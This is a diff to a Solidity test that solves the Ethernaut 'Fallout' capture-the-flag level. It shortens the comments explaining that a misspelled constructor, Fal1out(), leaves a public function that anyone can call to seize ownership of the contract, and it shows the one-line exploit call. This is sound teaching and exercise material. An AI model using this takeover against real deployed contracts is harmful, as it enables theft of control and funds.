@@ -24,25 +24,24 @@ contract TestFallout is BaseTest {
     }
 
     function setupLevel() internal override {
-        /** CODE YOUR SETUP HERE */
-
+        /**
+         * CODE YOUR SETUP HERE
+         */
         levelAddress = payable(this.createLevelInstance(true));
         level = Fallout(levelAddress);
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
+        /**
+         * CODE YOUR EXPLOIT HERE
+         */
+
+        // The goal here is to take over the ownership of Fallout
+        // Instead of using constuctor, Fal1out() is used, which is a public function and is not called anywhere during deployment
 
         vm.startPrank(player);
 
-        // Before Solidity 0.4.22 the only way to define a constructor for a contract was to define a function with the same name of the contract itself
-        // After that version they introduced a new `constructor` keyword to avoid this kind of mistake
-        // In this case the developer made the mistake to misstype the name of the constructor
-        // Contract name -> Fallout
-        // Constructor name -> Fal1out
-        // The result of this is that the contract was never initialized, the owner was the address(0)
-        // and we were able to call the `Fal1out` function that at this point is not a constructor (callable only once)
-        // but a "normal" function. This also mean that anyone can call multiple time this function switching the owner of the contract.
+        // Just call Fal1out() function to take initiate the onwer to be player address
         level.Fal1out();
 
         vm.stopPrank();
